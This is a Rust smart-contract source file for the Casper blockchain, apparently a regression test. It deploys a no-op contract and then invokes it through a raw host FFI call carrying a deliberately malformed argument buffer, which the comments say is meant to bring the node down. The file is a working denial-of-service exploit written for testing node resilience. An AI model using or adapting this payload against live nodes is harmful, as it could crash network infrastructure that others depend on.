#![no_std]
#![no_main]

extern crate alloc;

use alloc::{vec, vec::Vec};

use casper_contract::{self, contract_api::storage, unwrap_or_revert::UnwrapOrRevert};
use casper_types::{
    api_error, bytesrepr::ToBytes, contracts::Parameters, CLType, ContractHash, EntryPoint,
    EntryPointAccess, EntryPointType, EntryPoints,
};

#[no_mangle]
pub extern "C" fn do_nothing() {
    // A function that does nothing.
    // This is used to just pass the checks in `call_contract` on the host side.
}

// Attacker copied to_ptr from `alloc_utils` as it was private
fn to_ptr<T: ToBytes>(t: T) -> (*const u8, usize, Vec<u8>) {
    let bytes = t.into_bytes().unwrap_or_revert();
    let ptr = bytes.as_ptr();
    let size = bytes.len();
    (ptr, size, bytes)
}

mod malicious_ffi {
    // Potential attacker has available every FFI for himself
    extern "C" {
        pub fn casper_call_contract(
            contract_hash_ptr: *const u8,
            contract_hash_size: usize,
            entry_point_name_ptr: *const u8,
            entry_point_name_size: usize,
            runtime_args_ptr: *const u8,
            runtime_args_size: usize,
            result_size: *mut usize,
        ) -> i32;
    }
}

// This is half-baked runtime::call_contract with changed `extra_urefs`
// parameter with a desired payload that's supposed to bring the node down.
pub fn my_call_contract(contract_hash: ContractHash, entry_point_name: &str) -> usize {
    let (contract_hash_ptr, contract_hash_size, _bytes1) = to_ptr(contract_hash);

    let entry_point_name = ToBytes::to_bytes(entry_point_name).unwrap();
    let malicious_args = vec![255, 255, 255, 255, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9];

    {
        let mut bytes_written = 0usize;
        let ret = unsafe {
            malicious_ffi::casper_call_contract(
                contract_hash_ptr,
                contract_hash_size,
                entry_point_name.as_ptr(),
                entry_point_name.len(),
                malicious_args.as_ptr(),
                malicious_args.len(),
                &mut bytes_written as *mut usize,
            )
        };
        api_error::result_from(ret).unwrap_or_revert();
        bytes_written
    }
}

#[no_mangle]
pub extern "C" fn call() {
    let entry_points = {
        let mut entry_points = EntryPoints::new();

        let entry_point = EntryPoint::new(
            "do_nothing",
            Parameters::default(),
            CLType::Unit,
            EntryPointAccess::Public,
            EntryPointType::Contract,
        );

        entry_points.add_entry_point(entry_point);

        entry_points
    };
    let (contract_hash, _contract_version) = storage::new_contract(entry_points, None, None, None);

    my_call_contract(contract_hash, "do_nothing");
}
